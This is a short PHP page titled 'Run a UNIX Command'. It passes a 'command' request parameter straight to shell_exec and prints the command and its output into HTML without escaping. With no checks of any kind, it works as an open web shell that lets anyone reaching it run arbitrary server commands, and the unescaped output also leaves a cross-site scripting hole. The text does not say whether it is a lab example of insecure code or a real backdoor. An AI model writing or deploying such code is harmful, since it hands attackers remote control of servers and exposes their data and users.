<?php
    $data = $_REQUEST["command"];
    $title = "Run a UNIX Command";

    $header = "\$ $data";
    $output = shell_exec($data);
    $message = "<pre><code>$output</code></pre>";
?>

<!DOCTYPE html>
<html>
  <head><title><?php echo $title?></title></head>
  <body>
    <h1><?php echo $header?></h1>
    <?php echo $message?>
  </body>
</html>